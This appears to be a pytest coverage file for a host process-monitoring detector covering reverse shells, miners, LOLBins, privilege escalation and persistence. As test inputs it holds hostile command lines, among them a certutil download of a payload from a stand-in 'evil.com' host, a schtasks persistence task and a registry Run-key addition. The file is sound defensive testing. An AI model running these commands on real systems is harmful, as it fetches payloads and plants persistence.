"""Coverage booster for process_monitor.py.

Covers uncovered paths:
- ProcessReasoningEngine._has_network_connections
- ProcessReasoningEngine._check_reverse_shell edge cases
- ProcessReasoningEngine._check_crypto_miner below threshold
- ProcessReasoningEngine._check_suspicious_cmdline LOLBin patterns
- ProcessReasoningEngine._check_privilege_escalation edge cases
- ProcessReasoningEngine._check_persistence with various cmdlines
- _capture_evidence error handling
- ProcessMonitor lifecycle
- ProcessMonitor._default_handler rendering
"""

import time
from unittest.mock import patch, MagicMock, PropertyMock

import pytest


# ═══════════════════════════════════════════════════════════════════════════════
# REASONING ENGINE EDGE CASES
# ═══════════════════════════════════════════════════════════════════════════════


@pytest.fixture
def engine():
    from modules.process_monitor import ProcessReasoningEngine
    return ProcessReasoningEngine()


class TestReverseShellEdgeCases:
    """Edge cases for reverse shell detection."""

    def test_non_scripting_process_skipped(self, engine):
        """Non-scripting processes with no connections should be skipped."""
        info = {"name": "explorer.exe", "num_connections": 0}
        result = engine._check_reverse_shell(1234, info, {})
        assert result is None

    def test_scripting_no_connections_skipped(self, engine):
        """Scripting processes with no connections should be skipped."""
        info = {"name": "powershell.exe", "num_connections": 0}
        result = engine._check_reverse_shell(1234, info, {})
        assert result is None

    def test_has_network_connections_true(self, engine):
        """_has_network_connections should return True for processes with connections."""
        mock_proc = MagicMock()
        mock_conn = MagicMock()
        mock_proc.connections.return_value = [mock_conn]
        with patch("modules.process_monitor.psutil.Process", return_value=mock_proc):
            assert engine._has_network_connections({"pid": 1234}) is True

    def test_has_network_connections_no_such_process(self, engine):
        """_has_network_connections should handle NoSuchProcess."""
        import psutil
        mock_proc = MagicMock()
        mock_proc.connections.side_effect = psutil.NoSuchProcess(1234)
        with patch("modules.process_monitor.psutil.Process", return_value=mock_proc):
            assert engine._has_network_connections({"pid": 1234}) is False


class TestCryptoMinerEdgeCases:
    """Edge cases for crypto miner detection."""

    def test_low_cpu_clears_history(self, engine):
        """Process with CPU below threshold should clear history."""
        engine._cpu_history[999] = [95.0, 96.0]  # Previous high CPU readings
        info = {"name": "test.exe", "cpu_percent": 5.0}
        result = engine._check_crypto_miner(999, info)
        assert result is None
        assert len(engine._cpu_history[999]) == 0

    def test_not_enough_samples(self, engine):
        """Process with high CPU but not enough samples should not alert."""
        info = {"name": "test.exe", "cpu_percent": 90.0}
        result = engine._check_crypto_miner(888, info)
        assert result is None
        assert len(engine._cpu_history[888]) == 1


class TestSuspiciousCmdlineEdgeCases:
    """Edge cases for suspicious command line detection."""

    def test_empty_cmdline(self, engine):
        info = {"name": "test.exe", "cmdline": ""}
        result = engine._check_suspicious_cmdline(123, info)
        assert result is None

    def test_lolbin_with_http(self, engine):
        """LOLBin used with HTTP URL should be flagged."""
        info = {
            "name": "certutil.exe",
            "cmdline": "certutil -urlcache http://evil.com/payload.exe",
        }
        result = engine._check_suspicious_cmdline(123, info)
        assert result is not None
        assert result.threat_type == "SUSPICIOUS_CMDLINE"

    def test_lolbin_with_decode(self, engine):
        """LOLBin with -decode flag should be flagged."""
        info = {
            "name": "certutil.exe",
            "cmdline": "certutil -decode encoded.bin output.exe",
        }
        result = engine._check_suspicious_cmdline(123, info)
        assert result is not None
        assert result.threat_type == "SUSPICIOUS_CMDLINE"

    def test_lolbin_no_suspicious_flags(self, engine):
        """LOLBin without suspicious flags should not be flagged."""
        info = {
            "name": "certutil.exe",
            "cmdline": "certutil -help",
        }
        result = engine._check_suspicious_cmdline(123, info)
        assert result is None


class TestPrivilegeEscalationEdgeCases:
    """Edge cases for privilege escalation detection."""

    def test_sudo_detected(self, engine):
        info = {"name": "bash", "cmdline": "sudo useradd test"}
        result = engine._check_privilege_escalation(123, info)
        assert result is not None
        assert result.threat_type == "PRIVILEGE_ESC"

    def test_runas_detected(self, engine):
        info = {"name": "cmd.exe", "cmdline": "runas /user:admin cmd"}
        result = engine._check_privilege_escalation(123, info)
        assert result is not None

    def test_no_privilege_escalation(self, engine):
        info = {"name": "notepad.exe", "cmdline": "notepad readme.txt"}
        result = engine._check_privilege_escalation(123, info)
        assert result is None


class TestPersistenceEdgeCases:
    """Edge cases for persistence detection."""

    def test_schtasks_detected(self, engine):
        info = {"name": "cmd.exe", "cmdline": "schtasks /create /tn Updater /tr payload.exe"}
        result = engine._check_persistence(123, info)
        assert result is not None
        assert result.threat_type == "PERSISTENCE"

    def test_registry_detected(self, engine):
        info = {"name": "reg.exe", "cmdline": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}
        result = engine._check_persistence(123, info)
        assert result is not None

    def test_no_persistence(self, engine):
        info = {"name": "notepad.exe", "cmdline": "notepad readme.txt"}
        result = engine._check_persistence(123, info)
        assert result is None


class TestSuspiciousChainEdgeCases:
    """Edge cases for process chain detection."""

    def test_suspicious_chain(self, engine):
        """word.exe spawning powershell.exe should be suspicious."""
        result = engine._check_suspicious_chain(123, {
            "name": "powershell.exe",
            "parent_name": "word.exe",
            "parent_pid": 456,
        })
        assert result is not None
        assert result.threat_type == "SUSPICIOUS_CHAIN"

    def test_normal_chain(self, engine):
        """explorer.exe spawning powershell.exe should NOT be suspicious."""
        result = engine._check_suspicious_chain(123, {
            "name": "powershell.exe",
            "parent_name": "explorer.exe",
            "parent_pid": 456,
        })
        assert result is None


class TestEvidenceCapture:
    """Tests for _capture_evidence error handling."""

    def test_capture_evidence_fails_gracefully(self):
        """When evidence engine fails, threat should be returned unchanged."""
        from modules.process_monitor import ProcessThreat, _capture_evidence
        threat = ProcessThreat(
            timestamp="now", threat_type="TEST", risk_level="LOW",
            pid=1, process_name="test.exe", cmdline="",
            parent_name="", parent_pid=0, username="",
            reasoning="test", action_taken="LOG",
        )
        # Patch EvidenceEngine inside evidence_engine module (where it's imported from)
        with patch("modules.evidence_engine.EvidenceEngine.capture_process_evidence",
                   side_effect=Exception("capture failed")):
            result = _capture_evidence(123, threat)
            assert result is threat
            assert "forensic" not in result.evidence


class TestProcessMonitorLifecycle:
    """Test ProcessMonitor lifecycle."""

    @pytest.fixture
    def monitor(self):
        from modules.process_monitor import ProcessMonitor
        return ProcessMonitor()

    def test_start_stop(self, monitor):
        with patch("modules.process_monitor.psutil.process_iter", return_value=[]):
            monitor.start()
            assert monitor._running is True
            # Stop the running loop by setting stop_event
            monitor.stop()
            assert monitor._running is False

    def test_start_twice(self, monitor):
        with patch("modules.process_monitor.psutil.process_iter", return_value=[]):
            monitor.start()
            thread_id = id(monitor._thread)
            monitor.start()  # Second start should be no-op
            assert id(monitor._thread) == thread_id
            monitor.stop()

    def test_stop_without_start(self, monitor):
        monitor.stop()

    def test_default_handler_prints(self, capsys):
        """_default_handler should print formatted output."""
        from modules.process_monitor import ProcessMonitor, ProcessThreat
        threat = ProcessThreat(
            timestamp="2026-01-01T00:00:00",
            threat_type="REVERSE_SHELL",
            risk_level="CRITICAL",
            pid=1234,
            process_name="powershell.exe",
            cmdline="powershell -enc IABlAHgA",
            parent_name="explorer.exe",
            parent_pid=888,
            username="admin",
            reasoning="Test reasoning for reverse shell",
            action_taken="FLAG_FOR_AUTOBLOCK",
            evidence={},
        )
        ProcessMonitor._default_handler(threat)
        captured = capsys.readouterr()
        assert "REVERSE_SHELL" in captured.out
        assert "CRITICAL" in captured.out
        assert "powershell.exe" in captured.out

    def test_default_handler_with_forensic_evidence(self, capsys):
        """_default_handler should display process tree when forensic evidence present."""
        from modules.process_monitor import ProcessMonitor, ProcessThreat
        threat = ProcessThreat(
            timestamp="now", threat_type="REVERSE_SHELL", risk_level="CRITICAL",
            pid=1234, process_name="test.exe", cmdline="",
            parent_name="", parent_pid=0, username="",
            reasoning="test", action_taken="FLAG_FOR_AUTOBLOCK",
            evidence={
                "forensic": {
                    "process_tree": [
                        {"pid": 1, "name": "init", "cmdline": "/sbin/init"},
                        {"pid": 888, "name": "explorer.exe", "cmdline": "explorer.exe"},
                    ],
                },
            },
        )
        ProcessMonitor._default_handler(threat)
        captured = capsys.readouterr()
        assert "REVERSE_SHELL" in captured.out

    def test_scan_error_handling(self, monitor):
        """_scan should catch and log errors."""
        with patch.object(monitor, "_take_snapshot", side_effect=RuntimeError("scan error")):
            # Should not raise
            monitor._scan()
